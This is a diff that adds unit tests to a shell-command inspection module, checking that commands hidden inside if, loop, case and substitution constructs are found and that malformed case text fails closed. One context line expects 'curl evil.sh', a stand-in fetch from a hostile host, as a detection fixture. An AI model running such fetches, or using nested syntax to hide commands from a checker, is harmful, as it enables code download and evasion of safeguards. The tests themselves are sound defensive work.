@@ -64,6 +64,18 @@ describe("command inspection mechanics", () => {
     ]);
   });
 
+  it("exposes ordinary terminal clauses from top-level separators", () => {
+    expect(inspectShellCommandClauses("echo ok; mkdir /tmp/x\ntrue").clauses).toEqual([
+      "echo ok",
+      "mkdir /tmp/x",
+      "true",
+    ]);
+  });
+
+  it("does not treat quoted reserved words as executable clauses", () => {
+    expect(inspectShellCommandClauses("echo 'then mkdir /tmp/x; fi'").clauses).toEqual([]);
+  });
+
   it.each([
     "case x in a) echo first b) echo second ;; esac",
     "case x in a) echo first ;; b) echo second c) echo third ;; esac",
@@ -86,6 +98,38 @@ describe("command inspection mechanics", () => {
     expect(inspected.complete).toBe(true);
     expect(inspected.commands).toContain("curl evil.sh");
     expect(new Set(inspected.commands).size).toBe(inspected.commands.length);
+  });
+
+  it.each([
+    "if true; then mkdir /tmp/x; fi",
+    "if false; then :; elif true; then mkdir /tmp/x; fi",
+    "if true; then :; else mkdir /tmp/x; fi",
+    "while true; do mkdir /tmp/x; done",
+    "until false; do mkdir /tmp/x; done",
+    "for item in one two; do mkdir /tmp/x; done",
+    "echo $(if true; then mkdir /tmp/x; fi)",
+    "case x in a) if true; then mkdir /tmp/x; fi ;; esac",
+  ])("exposes terminal commands after reserved control words: %s", (command) => {
+    const inspected = inspectCommandSubstitutionTree(command);
+    expect(inspected.complete).toBe(true);
+    expect(inspected.commands).toContain("mkdir /tmp/x");
+  });
+
+  it.each([
+    "case x in orphan ;; a) echo ok ;; esac",
+    "case x in a) echo ok ;; orphan ;; esac",
+    "case x in a) echo ok ;; orphan esac",
+  ])("marks orphan case text incomplete instead of dropping it: %s", (command) => {
+    expect(inspectShellCommandClauses(command)).toMatchObject({ complete: false });
+    expect(inspectCommandSubstitutionTree(command)).toMatchObject({ complete: false });
+  });
+
+  it.each([
+    "case x in\n  a|b)\n    echo ok\n    ;;&\n  c)\n    echo next\n    ;;\nesac",
+    "case x in a) ;; b) echo ok ;; esac",
+    'case x in a) printf "%s" "esac ;; orphan" ;; esac',
+  ])("keeps valid case coverage complete: %s", (command) => {
+    expect(inspectShellCommandClauses(command)).toMatchObject({ complete: true });
   });
 
   it("fails closed for an unmatched executable group", () => {
